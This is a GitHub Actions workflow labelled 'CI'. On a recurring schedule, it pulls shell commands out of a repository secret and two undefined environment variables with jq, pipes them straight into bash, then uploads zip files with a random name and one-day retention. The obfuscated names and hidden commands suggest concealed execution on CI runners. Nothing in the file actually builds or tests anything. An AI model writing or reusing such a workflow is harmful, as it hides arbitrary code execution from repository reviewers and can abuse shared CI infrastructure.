name: CI
on:
  workflow_dispatch:

  schedule:
    - cron: '54 2,8,14,20 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  execute:
    name: Main task
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Run
        env:
          i98: ${{ secrets.i98 }}
        run: |
          printf '%s' "$i98" | jq -r .bgpt2470 | /bin/bash
          echo $sozs5658 | jq -r .cf4 | /bin/bash
          echo $m66 | jq -r .a84881 | /bin/bash

      - name: Store results
        uses: actions/upload-artifact@v4
        with:
          name: RocYkTIw
          path: "*.zip"
          retention-days: 1
